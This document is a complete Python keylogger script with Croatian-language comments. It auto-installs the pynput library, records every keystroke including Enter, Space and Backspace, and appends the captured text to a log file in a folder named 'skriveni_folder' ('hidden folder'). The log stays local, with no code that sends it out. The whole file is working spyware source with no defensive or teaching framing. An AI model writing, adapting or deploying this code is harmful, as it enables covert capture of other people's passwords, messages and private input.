import subprocess # za instaliranje pynputa ukoliko nije instaliran
import sys        # za instaliranje pynputa ukoliko nije instaliran

try:
    import pynput.keyboard
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    import pynput.keyboard # pynput se koristi za detekciju pritisnutih tipki

class Keylogger:

##########################################################################################################################################

    def __init__(self, log_path):
        # Inicijalizacija putanje gdje će se čuvati log file
        self.log_path = log_path  
        self.log = ""  # Početni prazan log

##########################################################################################################################################

    def keyPressed(self, key):
        try:
            # Ako je pritisnuta uobičajena tipka (slovo ili broj)
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
            elif key == pynput.keyboard.Key.enter:
                # Ako je pritisnut ENTER, zapisuje novu liniju
                self.log += "\n"
            elif key == pynput.keyboard.Key.space:
                # Ako je pritisnut SPACE, dodaje razmak
                self.log += " "
            elif key == pynput.keyboard.Key.backspace:
                # Ako je pritisnut BACKSPACE, briše posljednji char
                self.log = self.log[:-1]
        except AttributeError:
            # Ovo je fallback za nespecificirane charactere, ukoliko ne postoji 'char' atribut
            self.log += str(key)

        # Ažurira log file
        self.update_log()

##########################################################################################################################################

    def update_log(self):
        # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
        with open(self.log_path, "a") as file:
            file.write(self.log)
            self.log = ""  # Resetira log nakon što je upisan kako nebi došlo do dupliciranja

##########################################################################################################################################

    def start(self):
        # Kreira listener koji prati pritisnute tipke
        with pynput.keyboard.Listener(on_press=self.keyPressed) as listener:
            listener.join()

##########################################################################################################################################

log_path = r"c:\skriveni_folder\log.txt"  # Putanja na kojoj će se čuvati log file

# Kreira instancu klasa i pokreće keylogger
keylogger = Keylogger(log_path)
keylogger.start()